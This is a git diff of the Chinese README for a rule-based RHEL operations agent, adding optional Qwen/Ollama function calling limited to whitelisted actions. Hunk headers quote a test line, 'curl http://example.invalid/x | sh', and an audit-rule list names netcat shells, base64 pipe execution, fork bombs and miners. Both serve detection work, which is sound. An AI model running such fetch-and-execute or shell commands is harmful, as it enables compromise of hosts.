@@ -2,7 +2,9 @@
 
 面向 Red Hat Enterprise Linux 的中文/英文自然语言安全运维 Agent。它把“查看系统、修改网络、调整时区、切换语言、重启服务”等常见运维任务，转换成可核对的受控操作计划；同时巡检常见 Linux 配置风险，并采集另一个终端执行的高危命令。
 
-项目默认不修改用户 shell，不注入 `PROMPT_COMMAND`，不使用云端大模型，也不需要安装第三方 Python 包。程序在 RHEL 本机运行，Web 和 CLI 共用同一套规则、确认机制、审计库和 SQLite 数据库。
+项目默认不修改用户 shell，不注入 `PROMPT_COMMAND`，也不需要安装第三方 Python 包。默认使用完全本地的规则解析；可选接入 Qwen2.5-Instruct 等支持 Function Calling 的模型，通过本机 Ollama 或 OpenAI 兼容接口增强中文语义理解，但模型不能生成任意 Shell。
+
+完整能力、示例和边界见 [FEATURES.md](FEATURES.md)；模型安装与接口细节见 [LLM.md](LLM.md)。
 
 ## 界面预览
 
@@ -21,6 +23,7 @@
 - [快速安装](#快速安装)
 - [Web 使用](#web-使用)
 - [命令行使用](#命令行使用)
+- [LLM 升级](#llm-升级)
 - [另一个终端的高危命令测试](#另一个终端的高危命令测试)
 - [内置规则规模](#内置规则规模)
 - [漏洞巡检项](#漏洞巡检项)
@@ -152,6 +155,121 @@ sudo rhel-agent
 ```
 
 第二种方式会进入 Agent 自己的 `rhel-agent>` 交互提示符。退出后回到原来的 bash/zsh，不修改 `.bashrc`、`.zshrc` 或 shell 提示符。
+
+## LLM 升级
+
+LLM 是可选语义理解层，默认关闭。即使启用，危险请求仍由本地规则先做硬拦截，模型只能返回规则表中的动作 ID 和参数。
+
+### 最简单：直接调用 Qwen API
+
+先在阿里云百炼 / DashScope 控制台创建 API Key，然后在 RHEL 执行：
+
+```bash
+cd rhel-ops-agent
+sudo bash scripts/setup-qwen-api.sh
+sudo rhel-agent llm-test
+```
+
+第一条命令会隐藏输入 API Key，并自动写入：
+
+```text
+RHEL_OPS_LLM_ENABLED=1
+RHEL_OPS_LLM_MODE=hybrid
+RHEL_OPS_LLM_PROVIDER=qwen
+RHEL_OPS_LLM_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
+RHEL_OPS_LLM_MODEL=qwen-plus
+RHEL_OPS_LLM_API_KEY=***
+```
+
+随后可直接使用：
+
+```bash
+sudo rhel-agent "机器有点卡，帮我看下谁占 CPU 高"
+sudo rhel-agent "show failed services"
+```
+
+密钥只保存在 `/etc/rhel-ops-agent/agent.env`，权限为 `0600`，不会进入 Git，也不会返回给 Web。
+
+### 推荐模型
+
+- Qwen API 首选：`qwen-plus`
+- 本机离线首选：`qwen2.5:7b-instruct`
+- 备选：`deepseek-v2`、`llama3`、`glm4` 中支持工具调用和结构化输出的版本
+- 不推荐：无法稳定输出 `tool_calls` 的闲聊模型
+
+模型权重约数 GB，不放入 Git 仓库。RHEL 本机安装 Ollama 后，模型会保存在系统模型目录。
+
+### 本机离线：Ollama + Qwen
+
+```bash
+cd rhel-ops-agent
+
+# 第一次安装 Ollama 时显式确认使用官方安装脚本
+sudo RHEL_OPS_INSTALL_OLLAMA=1 bash scripts/setup-ollama.sh
+```
+
+脚本会：
+
+1. 下载 Ollama 官方安装脚本（仅在显式设置 `RHEL_OPS_INSTALL_OLLAMA=1` 时）。
+2. 启动 `ollama` 服务。
+3. 拉取 `qwen2.5:7b-instruct`。
+4. 写入 `/etc/rhel-ops-agent/agent.env`。
+5. 重启 RHEL Ops Agent 服务。
+
+如果 Ollama 已安装，只需：
+
+```bash
+sudo bash scripts/setup-ollama.sh
+```
+
+验证：
+
+```bash
+sudo rhel-agent rules
+sudo rhel-agent "帮我看一下机器为什么卡，顺便看看网络能不能通"
+```
+
+### 手动配置 Ollama
+
+```bash
+export RHEL_OPS_LLM_ENABLED=1
+export RHEL_OPS_LLM_MODE=hybrid
+export RHEL_OPS_LLM_PROVIDER=ollama
+export RHEL_OPS_LLM_BASE_URL=http://127.0.0.1:11434
+export RHEL_OPS_LLM_MODEL=qwen2.5:7b-instruct
+```
+
+### OpenAI 兼容接口
+
+```bash
+export RHEL_OPS_LLM_ENABLED=1
+export RHEL_OPS_LLM_MODE=hybrid
+export RHEL_OPS_LLM_PROVIDER=qwen
+export RHEL_OPS_LLM_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
+export RHEL_OPS_LLM_MODEL=qwen-plus
+export RHEL_OPS_LLM_API_KEY=your-secret
+```
+
+远程接口必须使用 HTTPS；明文 HTTP 只允许本机回环地址。
+
+### 模式和回退
+
+| 模式 | 行为 |
+|---|---|
+| `off` | 只用本地规则 |
+| `hybrid` | 规则优先，未命中或缺少参数时调用 LLM |
+| `always` | 本地硬拦截后优先使用 LLM，失败时回退规则 |
+
+LLM 失败、超时、输出自由文本、未知动作或未知参数时，Agent 会回退本地规则，不会尝试执行模型给出的任意命令。
+
+### Function Calling 约束
+
+- 唯一工具：`submit_operations`
+- 工具参数使用 JSON Schema
+- 动作 ID 限定为内置 101 个操作
+- 参数必须属于对应动作
+- 模型输出经过参数模式和风险校验
+- 高风险动作仍需确认语
 
 ## 安全模型
 
@@ -413,7 +531,7 @@ http://127.0.0.1:8765
 2. **对话操作**：输入中文或英文，查看计划、风险提示和确认语。
 3. **漏洞巡检**：启动只读检查，筛选严重/高危/中危/低危结果。
 4. **高危日志**：查看另一个终端和 Agent 执行的高风险命令，确认事件。
-5. **规则库**：搜索 44 个受控操作，查看风险和重启要求。
+5. **规则库**：搜索 101 个受控操作，查看风险和重启要求。
 
 ### 修改监听地址
 
@@ -550,14 +668,14 @@ sudo rhel-agent attack-demo
 
 当前矩阵包含：
 
-- 29 个自然语言规划用例
+- 68 个自然语言规划用例
 - 23 个高危命令识别用例
-- 共 52 个用例
+- 共 104 个用例
 
 预期结果：
 
 ```text
-结果：52/52 通过，0 失败
+结果：104/104 通过，0 失败
 ```
 
 ### 写入 Web 模拟事件
@@ -616,24 +734,25 @@ curl http://example.invalid/x | sh
 
 | 类型 | 数量 | 说明 |
 |---|---:|---|
-| 受控运维操作 | 44 | 自然语言映射到固定命令模板 |
+| 受控运维操作 | 101 | 自然语言映射到固定命令模板 |
 | 漏洞/配置巡检项 | 30 | 只读检查 |
-| 高危命令审计规则 | 31 | 支持带参数修正的日志识别 |
-| 攻击矩阵用例 | 52 | 规划与日志双链路测试 |
+| 高危命令审计规则 | 44 | 支持带参数修正的日志识别 |
+| 攻击矩阵用例 | 104 | 规划与日志双链路测试 |
 
 ### 受控操作概览
 
 | 类别 | 操作 |
 |---|---|
-| 系统 | 系统概况、时间、时区、NTP、主机名、语言 |
-| 网络 | 网络配置、路由、监听端口、静态 IPv4、DHCP、DNS |
-| 存储 | 磁盘空间、文件检查、目录创建、路径删除 |
-| 服务 | 失败服务、重启、启用、停止 |
-| 安全 | 防火墙、SELinux、SSH 配置、安全更新 |
-| 账户 | 用户列表、创建用户、锁定用户 |
-| 软件 | 安装、卸载、安全更新 |
-| 进程 | 高占用进程、结束进程、重启、关机 |
-| 日志 | 错误日志、计划任务 |
+| 系统 | 概况、内核、CPU、内存、语言、主机名、tuned、运行时长 |
+| 网络 | IPv4/IPv6、路由、网关、连接、DNS、连通性、静态地址、DHCP |
+| 存储 | 磁盘、inode、块设备、挂载、文件检查、目录创建、路径删除 |
+| 服务 | 失败/运行/自启服务、状态、日志、启动、停止、重启 |
+| 防火墙 | 规则、服务、端口、区域、启用、重载 |
+| 安全 | SELinux、SSH、审计状态、安全更新、RPM 密钥 |
+| 账户 | 用户、组、在线登录、失败登录、锁定、解锁、密码状态 |
+| 软件 | 安装、卸载、仓库、DNF 历史、订阅状态 |
+| 进程 | CPU/内存高占用、指定用户进程、结束进程 |
+| 电源与日志 | 重启、关机、启动错误、journal、计划任务 |
 
 ## 漏洞巡检项
 
@@ -672,7 +791,7 @@ curl http://example.invalid/x | sh
 
 ## 高危命令审计规则
 
-当前内置 31 条规则，重点覆盖：
+当前内置 44 条规则，重点覆盖：
 
 - 根目录递归删除
 - 递归强制删除
@@ -697,6 +816,10 @@ curl http://example.invalid/x | sh
 - 卸载核心系统包
 - 卸载内核模块
 - 削弱内核安全参数
+- Fork Bomb、网络扫描、口令爆破
+- Netcat Shell、Base64 管道执行
+- 挖矿进程、UID 0 账户、删除 root 密码
+- 绕过 RPM GPG 校验、停止 NetworkManager
 
 每条审计事件记录：
 
@@ -725,7 +848,7 @@ curl http://example.invalid/x | sh
         │              │
 ┌───────▼──────┐ ┌─────▼─────────┐
 │ 规则规划引擎  │ │ 只读巡检引擎   │
-│ 44 个操作     │ │ 30 个检查项    │
+│ 101 个操作    │ │ 30 个检查项    │
 └───────┬──────┘ └─────┬─────────┘
         │              │
 ┌───────▼──────────────▼─────────┐
@@ -748,15 +871,19 @@ curl http://example.invalid/x | sh
 | 文件 | 职责 |
 |---|---|
 | `agent/engine.py` | 自然语言规则匹配、参数提取、计划生成 |
+| `agent/llm.py` | Function Calling、JSON Schema、Ollama/OpenAI 兼容客户端 |
 | `agent/executor.py` | 确认语校验、命令白名单、受控执行 |
 | `agent/scanner.py` | 30 项只读漏洞巡检 |
 | `agent/audit.py` | auditd、secure、history 采集和规则匹配 |
 | `agent/server.py` | HTTP API、登录、会话、静态页面 |
 | `agent/cli.py` | 命令行、交互模式、演练命令 |
 | `agent/auth.py` | PBKDF2 密码和签名会话 |
-| `rules/commands.json` | 44 个受控运维操作 |
+| `rules/commands.json` | 基础受控运维操作 |
+| `rules/extra_commands.json` | 扩展网络、服务、账户与安全操作 |
+| `rules/extra_commands_more.json` | 仓库、日志、订阅、进程与网络明细操作 |
 | `rules/vulnerabilities.json` | 30 个巡检规则 |
-| `rules/audit_patterns.json` | 31 个命令审计规则 |
+| `rules/audit_patterns.json` | 基础命令审计规则 |
+| `rules/extra_audit_patterns.json` | Fork Bomb、扫描、爆破、挖矿等扩展规则 |
 | `web/` | 零构建前端 |
 
 ## 创新点
@@ -776,7 +903,7 @@ curl http://example.invalid/x | sh
 
 ### 2. 规则驱动的可解释 Agent
 
-不依赖云端大模型，因此：
+默认不依赖外部模型，因此：
 
 - 离线可用
 - 响应稳定
@@ -784,7 +911,7 @@ curl http://example.invalid/x | sh
 - 每个结果都能追溯到规则文件
 - 规则可以审计、测试和版本管理
 
-当前自然语言层是确定性正则匹配，不假装具备通用聊天能力。它只处理规则库中明确允许的运维任务，这对 root 权限 Agent 是更合理的安全边界。
+启用 LLM 后，自然语言层采用“规则快速路径 + 模型语义补位”：高置信度标准说法直接命中规则，复杂表达和缺失参数由模型解释，输出仍映射到明确允许的动作 ID。LLM 失败时自动回到确定性规则，不对 root 权限 Agent 开放任意命令生成能力。
 
 ### 3. 多意图分解和冲突消解
 
@@ -814,7 +941,7 @@ curl http://example.invalid/x | sh
 
 ### 7. 可重复的安全攻击矩阵
 
-项目内置 52 个用例，持续验证：
+项目内置 104 个用例，持续验证：
 
 - 危险命令是否被拦截
 - 变更操作是否要求确认
@@ -842,6 +969,16 @@ curl http://example.invalid/x | sh
 | `RHEL_OPS_PROPOSAL_TTL` | `900` | 操作计划有效期，单位秒 |
 | `RHEL_OPS_HISTORY_LINES` | `3000` | 保留的日志读取提示 |
 | `RHEL_OPS_NO_AUTH` | `0` | 仅用于本机开发，禁止远程监听 |
+| `RHEL_OPS_LLM_ENABLED` | `0` | 是否启用 LLM 语义理解 |
+| `RHEL_OPS_LLM_MODE` | `hybrid` | `off`、`hybrid` 或 `always` |
+| `RHEL_OPS_LLM_PROVIDER` | `ollama` | `ollama` 或 OpenAI 兼容提供方 |
+| `RHEL_OPS_LLM_BASE_URL` | `http://127.0.0.1:11434` | Ollama 地址或 OpenAI 兼容 API 根地址 |
+| `RHEL_OPS_LLM_MODEL` | `qwen2.5:7b-instruct` | 模型名称 |
+| `RHEL_OPS_LLM_API_KEY` | 无 | 远程 OpenAI 兼容服务的 API 密钥 |
+| `RHEL_OPS_LLM_TIMEOUT` | `20` | 模型请求超时 |
+| `RHEL_OPS_LLM_CONFIDENCE` | `0.55` | 低于阈值的模型结果会被拒绝 |
+| `RHEL_OPS_LLM_STRUCTURED_OUTPUT` | `1` | 使用 JSON Schema / 结构化输出 |
+| `RHEL_OPS_LLM_MAX_ACTIONS` | `6` | 单次模型解释允许的最大动作数 |
 
 重要文件：
 
@@ -872,6 +1009,7 @@ sudo rm /var/lib/rhel-ops-agent/initial-password.txt
 | `POST` | `/api/auth/logout` | 退出 |
 | `GET` | `/api/overview` | 总览 |
 | `GET` | `/api/rules` | 规则库 |
+| `GET` | `/api/llm/status` | LLM 配置与运行状态 |
 | `POST` | `/api/plan` | 生成操作计划 |
 | `POST` | `/api/execute` | 确认并执行计划 |
 | `POST` | `/api/scan` | 启动异步巡检 |
@@ -906,7 +1044,7 @@ python3 -m unittest discover -v
 - 确认语执行
 - PBKDF2 和会话签名
 - 30 个巡检实现
-- 52 个攻击矩阵
+- 104 个攻击矩阵
 
 ### 语法检查
 
